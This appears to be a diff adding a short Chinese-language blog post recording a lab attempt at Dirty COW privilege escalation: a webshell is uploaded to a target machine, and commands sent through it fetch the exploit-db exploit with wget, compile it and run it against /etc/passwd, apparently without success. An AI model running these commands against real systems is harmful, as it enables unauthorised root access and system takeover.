@@ -1,0 +1,28 @@
+<p>refer to: <br /><a href="https://www.exploit-db.com/exploits/40839 " target="_blank">https://www.exploit-db.com/exploits/40839</a>
+</p>
+<p>1. 上传webshell.php 到靶机</p>
+<p>2. 看一下这个： exploit-db.com 的内容，注意要搜索 dirty , 而不是搜索cve </p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230118_090151.png" /></p>
+<p>3. 进入到该 漏洞的细节页面：</p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230118_085947.png" /></p>
+<p>可以看到基本的用法为：</p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230118_090349.png" /></p>
+<p>4. 使用postman 进行基本操作</p>
+<pre>cmd: wget https://www.exploit-db.com/download/40839 -O /tmp/dirty-cow-0118.c
+cmd: ls /tmp -al
+cmd: chmod 777 /tmp/dirty-cow-0118.c
+cmd: gcc -pthread /tmp/dirty-cow-0118.c -o /tmp/dirty-cow-0118 -lcrypt
+cmd: ls /tmp -al
+</pre>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230118_090552.png" /></p>
+<p>然后执行该文件，会发现好久没出现response （需要等待）</p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230118_090639.png" /></p>
+<p>此时，从root的视角来看， CPU占用基本慢了：(我的是1core 1g 的机器) 所以最好在postman中设置好timeout, 设置大些</p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230118_090730.png" /></p>
+<p>大概3分钟后， 看到结果：</p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230118_091141.png" /></p>
+<p>不过 貌似没生效。不要紧了，先这样。这个靶机是 2023年1月购买的，非常新，所以没生效是非常正常的。</p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230118_091430.png" /></p>
+<p>（看起来 跟文件有关系， /etc/passwd 太敏感，写入失败，估计有进程在保护。）</p>
+<p>我们随便创建一个文件：/etc/hi </p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230128_163938.png" /></p>
